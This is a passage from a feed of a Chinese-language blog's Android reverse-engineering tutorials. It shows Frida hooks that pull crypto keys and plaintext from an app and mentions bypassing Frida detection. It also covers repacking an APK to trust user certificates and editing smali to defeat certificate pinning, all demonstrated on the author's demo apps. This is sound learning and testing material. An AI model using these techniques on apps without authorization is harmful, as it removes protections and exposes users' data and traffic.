class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'reflect'</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"hook-%E5%AD%97%E4%B8%B2%E6%93%8D%E4%BD%9C\"><a class=\"direct-link\" href=\"#hook-%E5%AD%97%E4%B8%B2%E6%93%8D%E4%BD%9C\">#</a> hook 字串操作</h3>\n<p>有些混淆程式會把程式中寫死的字串全都透過各種步驟打亂，讓人不易搜尋，例如說把字串變成數字然後再還原之類的，而在還原的時候通常都會經過字串操作，這時候我們可以直接去 hook 字串操作，並搭配前面提過的 stack trace 去追蹤：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">[</span><span class=\"token string\">'java.lang.StringBuilder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'java.lang.StringBuffer'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">clazz<span class=\"token punctuation\">,</span> i</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>clazz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'toString'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> ret <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ret:'</span><span class=\"token punctuation\">,</span> ret<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span>   <br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </code></pre>\n<h3 id=\"hook-%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%9B%B8%E9%97%9C%E6%93%8D%E4%BD%9C\"><a class=\"direct-link\" href=\"#hook-%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%9B%B8%E9%97%9C%E6%93%8D%E4%BD%9C\">#</a> hook 加解密相關操作</h3>\n<p>通常在 Android App 裡面要進行加解密的話，都會透過內建的 API 來進行，像是這樣（來源：<a href=\"https://cloud.tencent.com/developer/article/1647740\">Android中的AES加密--上</a>）：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> CODE_TYPE <span class=\"token operator\">=</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> AES_TYPE <span class=\"token operator\">=</span> <span class=\"token string\">\"AES/ECB/PKCS5Padding\"</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> AES_KEY<span class=\"token operator\">=</span><span class=\"token string\">\"1111222233334444\"</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> cleartext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">SecretKeySpec</span> key <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SecretKeySpec</span><span class=\"token punctuation\">(</span>AES_KEY<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AES\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Cipher</span> cipher <span class=\"token operator\">=</span> <span class=\"token class-name\">Cipher</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>AES_TYPE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        cipher<span class=\"token punctuation\">.</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Cipher</span><span class=\"token punctuation\">.</span>ENCRYPT_MODE<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> encryptedData <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span><span class=\"token function\">doFinal</span><span class=\"token punctuation\">(</span>cleartext<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span>CODE_TYPE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>encryptedData<span class=\"token punctuation\">,</span><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span>DEFAULT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>所以只要能 hook 像是 <code>SecretKeySpec</code> 或是 <code>doFinal</code> 這些方法，就能夠攔截到 key 跟加密前的明文。</p>\n<p>這篇文章值得一看：<a href=\"https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication/\">How Secure is your Android Keystore Authentication ?</a>，裡面有附了一堆加解密相關的 Frida 腳本，在這裡：<a href=\"https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js\">https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js</a></p>\n<p>話說腳本裡面沒有直接把 byte array 轉成字串，這邊提供一個比較方便的方式（來源：<a href=\"https://lingwu111.github.io/frida%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bstring%E4%B8%8Ebyte%E8%BD%AC%E5%8C%96.html\">frida小技巧之string与byte转化</a>）：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">bytesToString</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">bytes</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> javaString <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'java.lang.String'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> javaString<span class=\"token punctuation\">.</span>$<span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> Base64 <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'android.util.Base64'</span><span class=\"token punctuation\">)</span><br>Base64<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[B'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'int'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span> b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">bytesToString</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h2 id=\"%E5%81%B5%E6%B8%AC-frida\"><a class=\"direct-link\" href=\"#%E5%81%B5%E6%B8%AC-frida\">#</a> 偵測 Frida</h2>\n<p>既然 Frida 這麼強大，那有些 app 的安全機制自然而然想把它擋下來，一旦偵測到 Frida 的蹤跡，就直接退出 app 或是製造當機，可以參考底下這兩篇：</p>\n<ol>\n<li><a href=\"https://www.jianshu.com/p/f679cb404524\">Android逆向 多种特征检测 Frida</a></li>\n<li><a href=\"https://blog.csdn.net/zhangmiaoping23/article/details/109697329\">多种特征检测 Frida</a></li>\n</ol>\n<p>而反偵測的方式有很多種，其中一種就是去 hook 上面文章提到的各種方法，畢竟我們有 root 權限又有 Frida hook 在前，所以只要我們知道是怎麼判斷的，就一定可以把檢查拿掉。如果找不出檢查的地方，可以利用上面提到的各種 hook 抽絲剝繭，慢慢找出來。</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>在這篇裡面我們介紹了 Frida 的基本使用，學習如何使用 Frida 來 hook 各種方法，藉此來得到各種我們想要的資訊。</p>\n<p>而前四篇我們涵蓋了一些基本的東西，包括：</p>\n<ol>\n<li>基本的 Android App 組成</li>\n<li>如何用 Apktool 把 apk 拆開並裝回去</li>\n<li>如何用 jadx 把 smali 還原成 java 檔</li>\n<li>熟悉一點點 smali 的語法，知道如何改 code 以及加 code</li>\n<li>如何透過電腦上的 proxy 攔截封包</li>\n<li>如何改造 apk，讓 proxy 能夠順利攔截</li>\n<li>如何使用 Frida 來 hook function</li>\n<li>各種 Frida 的小技巧</li>\n</ol>\n<p>再往後走的話，就要進入 native 的領域了。</p>\n<p>除了使用 Java 撰寫 Android App 以外，也可以使用 <a href=\"https://developer.android.com/ndk\">Android NDK</a>，就可以用 C/C++ 撰寫程式碼，提供給 Android app 使用。</p>\n<p>什麼情況會需要用到呢？第一是比較耗效能的地方，例如說圖片辨識之類的，用 C++ 來寫會比 Java 來得快，所以通常會用 native 來做，第二則是一些比較隱密的操作，例如說加解密，如果放在 Java 層，很容易就能反編譯並且看出在做什麼，用 native 來寫的話會需要更多 binary 相關知識才能破解。</p>\n<p>除此之外，現實世界中的 app 並不像我們前面示範的 app 這麼簡單，可能經過加殼或是更強程度的混淆，就算 apk 拆得開，只要殼拆不掉，就看不到真正的邏輯。有些殼也具有反竄改跟反動態分析的機制，能夠把功力不足的攻擊者們阻擋在外，相關的介紹可以參考 <a href=\"http://confapi.ithome.com.tw/session/4186\">2019 台灣資安週</a>的議程：<a href=\"https://s.itho.me/cybersec/2019/slides/321/I_%E4%B8%96%E8%B2%BF%E4%B8%89/0321I51610%E7%8E%8B%E7%BE%BF%E5%BB%B7.pdf\">打造⼀一個安全與便利性兼具的 App 安全防護產品</a></p>\n<p>這個系列之所以叫做「入門」，就是因為完全沒有提到這些實戰上會接觸的東西，只專注於入門的基礎跟工具；話雖如此，對於沒有特殊混淆或是加殼的 app，這樣應該就足夠了。</p>\n<p>參考資料：</p>\n<ol>\n<li><a href=\"https://github.com/hookmaster/frida-all-in-one\">《FRIDA操作手册》</a></li>\n<li><a href=\"https://www.giantbranch.cn/2019/10/25/%E7%BF%BB%E8%AF%91%E2%80%94%E2%80%94N%E7%A7%8D%E8%84%B1%E5%A3%B3%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/\">翻译——N种脱壳安卓恶意软件的方式</a></li>\n<li><a href=\"https://kevinspider.github.io/fridahookjava/\">frida hook java</a></li>\n<li><a href=\"https://juejin.cn/post/6847902219757420552#heading-39\">这恐怕是学习Frida最详细的笔记了</a></li>\n<li><a href=\"https://github.com/iddoeldor/frida-snippets#class-description\">frida-snippets</a></li>\n<li><a href=\"https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial\">Frida Tutorial</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/197657\">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></li>\n</ol>\n",
      "date_published": "2022-02-21T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-3/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-3/",
      "title": "Android App 逆向入門之三：監聽 app 封包",
      "content_html": "<!-- summary -->\n<!-- 監聽 App 的 request 是個很常見的需求，無論是 Android 工程師或者是前端工程師，都有可能會因為要 debug，所以必須看見 App 到底發了哪些 request，這篇就讓我們來看看該怎麼做。 -->\n<!-- summary -->\n<p>我記得在我剛接觸 Android 沒多久的時候，要看 app 到底發了哪些 request 是很簡單的一件事情。只要在電腦上面裝個 <a href=\"https://www.charlesproxy.com/\">Charles</a>，接著設定手機上的 Wifi，讓它 proxy 到電腦上，然後輸入特定網址下載 Charles 提供的憑證，安裝完成以後就搞定了。</p>\n<p>但前陣子用了一樣的流程，雖然有聽到一些封包，但從 app 出來的流量卻是空的，上網找了各式各樣的解法之後都行不通。</p>\n<p>最後我才知道，原來是 Android 在 6.0 以上改變了安全性的設定，預設就不相信使用者自行安裝的憑證，所以才會攔截不到。有種做法是裝個 local VPN，這樣流量就會全部都過 proxy，但我試過以後發現還是有點麻煩。</p>\n<p>在眾多方法之中，我試過最有用的方法，就是把 apk 拆開，改一些設定之後再裝回去，這篇就來記錄一下流程跟心得。</p>\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n<h2 id=\"%E5%89%8D%E7%BD%AE%E4%BD%9C%E6%A5%AD\"><a class=\"direct-link\" href=\"#%E5%89%8D%E7%BD%AE%E4%BD%9C%E6%A5%AD\">#</a> 前置作業</h2>\n<p>前置作業一共有兩項：</p>\n<ol>\n<li>準備 proxy</li>\n<li>設置手機</li>\n</ol>\n<p>Proxy 的部分其實任選一套都可以，我是用常見的 <a href=\"https://portswigger.net/burp\">Burp Suite</a>，其他軟體的設置應該也都大同小異。</p>\n<p>首先，先到 Proxy -&gt; Options 裡面新增 Proxy Listeners，bind to address 的部分記得選 all interfaces，手機才連的到：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p7-proxy.png\" alt=\"\"></p>\n<p>電腦的 proxy 就這樣設置完成了，接著我們來設定手機。</p>\n<p>在開始設定以前，記得要先讓手機跟電腦連到同一個 wifi，才會在同樣的網路底下。再來，在電腦上看一下自己的內網 IP 是多少，前往手機裡的設定 =&gt; 連線 =&gt; Wi-Fi，接著編輯連到的網路，設置手動 proxy，讓手機的流量 proxy 到電腦去。</p>\n<p>然後我們要在手機上安裝 Burp Suite 的憑證，手機上直接造訪 <code>http://burpsuite</code> 即可，會下載一個檔案叫做 <code>cert.der</code>，記得改名成 <code>cert.cer</code> 後點開就可以安裝憑證。</p>\n<p>到這邊為止，手機上的準備就完成了。</p>\n<h2 id=\"%E6%94%B9%E9%80%A0-apk\"><a class=\"direct-link\" href=\"#%E6%94%B9%E9%80%A0-apk\">#</a> 改造 apk</h2>\n<p>這次拿來示範的 apk 在這裡：<a href=\"https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk\">https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk</a></p>\n<p>App 的內容很簡單，就是按下按鈕以後會發 request，只要有監聽到就代表成功了。裝上 app 之後可以先試試看，你應該會發現儘管上面那些都設定好了，proxy 還是一片空白。</p>\n<p>原因就如同我開頭講的一樣，在 Android 官方文件裡有一個章節就在講這個：<a href=\"https://developer.android.com/training/articles/security-config\">Network security configuration</a></p>\n<p>而改造方法也很簡單，基本上不需要動到程式碼，因此我們先用 Apktool 把 apk 解開。</p>\n<p>接著打開 AndroidManifest.xml，找到 <code>&lt;application&gt;</code> 的地方，看一下有沒有 <code>android:networkSecurityConfig</code> 這個屬性，沒有的話就加上去：<code>android:networkSecurityConfig=&quot;@xml/network_security_config&quot;</code>，有的話就記住 xml 的名稱。</p>\n<p>再來我們去 res/xml 底下，新增 <code>network_security_config.xml</code>，內容為：</p>\n<pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>network-security-config</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>base-config</span> <span class=\"token attr-name\">cleartextTrafficPermitted</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>true<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>trust-anchors</span><span class=\"token punctuation\">></span></span><br>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>certificates</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>system<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><br>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>certificates</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>user<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>trust-anchors</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>base-config</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>network-security-config</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這個檔案內容代表這個 app 信任所有憑證，包括使用者自行安裝的憑證也是。如果 app 裡面本來就有這個檔案，你可以把內容取代成上面的，確保 app 有信任使用者的憑證。</p>\n<p>接著把 apk 打包裝回去，再按下按鈕看看，應該就能從 proxy 看到攔截到的流量：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p8-success.png\" alt=\"\"></p>\n<h2 id=\"certificate-pinning\"><a class=\"direct-link\" href=\"#certificate-pinning\">#</a> Certificate pinning</h2>\n<p>如果上面的動作做完以後，proxy 還是監聽不到，那就代表 app 裡面可能有其他安全性的設置，例如說 certificate pinning。</p>\n<p>什麼是 certificate pinning 呢？如果網頁有用 https，就代表伺服器有一個 https 的憑證，而 certificate pinning 就代表 app 裡有指定某個 domain 對應到的憑證應該要是什麼，如果憑證不符，就代表有人在中間搞事，所以拒絕連線。</p>\n<p>以熱門的 library OkHttp 為例，<a href=\"https://square.github.io/okhttp/4.x/okhttp/okhttp3/-certificate-pinner/\">文件</a>上就有寫說應該怎麼實作這個功能：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token class-name\">String</span> hostname <span class=\"token operator\">=</span> <span class=\"token string\">\"publicobject.com\"</span><span class=\"token punctuation\">;</span><br><span class=\"token class-name\">CertificatePinner</span> certificatePinner <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CertificatePinner<span class=\"token punctuation\">.</span>Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> <span class=\"token string\">\"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token class-name\">OkHttpClient</span> client <span class=\"token operator\">=</span> <span class=\"token class-name\">OkHttpClient<span class=\"token punctuation\">.</span>Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">certificatePinner</span><span class=\"token punctuation\">(</span>certificatePinner<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br><span class=\"token class-name\">Request</span> request <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Request<span class=\"token punctuation\">.</span>Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://\"</span> <span class=\"token operator\">+</span> hostname<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>client<span class=\"token punctuation\">.</span><span class=\"token function\">newCall</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>如果想實作看看的話，可以拿這個 apk 檔來嘗試：<a href=\"https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk\">https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk</a></p>\n<p>我們一樣用 apktool 解開，接著先照之前那樣，把 network security config 給放進去，再來就是要找到程式碼哪裡有用到 certificate pinner 了。</p>\n<p>因為這次的程式碼有開啟 proguard，所以連 okhttp 也被混淆了，直接用 <code>certificatePinner</code> 做關鍵字下去搜尋不一定找得到東西。那怎麼辦呢？我們可以換個方式，在使用這個功能的時候，一定要寫一組 sha256 的值在裡面，所以我們可以搜尋：<code>sha256/</code></p>\n<p>可以找到這樣一個段落：</p>\n<pre class=\"language-java\"><code class=\"language-java\"># virtual methods<br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">13</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">1</span><br>    <span class=\"token keyword\">new</span><span class=\"token operator\">-</span>instance v0<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>util<span class=\"token operator\">/</span><span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">;</span><br><br>    invoke<span class=\"token operator\">-</span>direct <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>util<span class=\"token operator\">/</span><span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>init<span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string v1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">2</span><br>    filled<span class=\"token operator\">-</span><span class=\"token keyword\">new</span><span class=\"token operator\">-</span>array <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object v1<br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string v2<span class=\"token punctuation\">,</span> <span class=\"token string\">\"archive.org\"</span><br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string v3<span class=\"token punctuation\">,</span> <span class=\"token string\">\"pattern\"</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">3</span><br>    invoke<span class=\"token operator\">-</span><span class=\"token keyword\">static</span> <span class=\"token punctuation\">{</span>v2<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lc</span><span class=\"token operator\">/</span>j<span class=\"token operator\">/</span>b<span class=\"token operator\">/</span>d<span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">;</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string v3<span class=\"token punctuation\">,</span> <span class=\"token string\">\"pins\"</span><br><br>    invoke<span class=\"token operator\">-</span><span class=\"token keyword\">static</span> <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lc</span><span class=\"token operator\">/</span>j<span class=\"token operator\">/</span>b<span class=\"token operator\">/</span>d<span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">;</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> v3<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> v4<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span></code></pre>\n<p>找到之後該做什麼呢？難道要去改 smali，把 certificate pinner 拿掉嗎？其實有更簡單的做法。</p>\n<p>從程式碼中可以猜得出來底下那個 <code>archive.org</code> 應該就是綁定的網域，因此只要把這個網域隨便改成其他字串即可，如此一來其他的網域就不會檢查憑證是否相符。</p>\n<p>改完以後重新打包 app 並安裝，就能正常監聽到流量。</p>\n<p>像上面這樣是去改變使用 certificatePinner 的地方，還有另一個方式是直接去改變 okhttp 的實作，找到 smali 中的 <code>okhttp3/CertificatePinner$Builder.smali</code>，有一個 function 是：</p>\n<pre class=\"language-java\"><code class=\"language-java\"># virtual methods<br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> varargs <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token 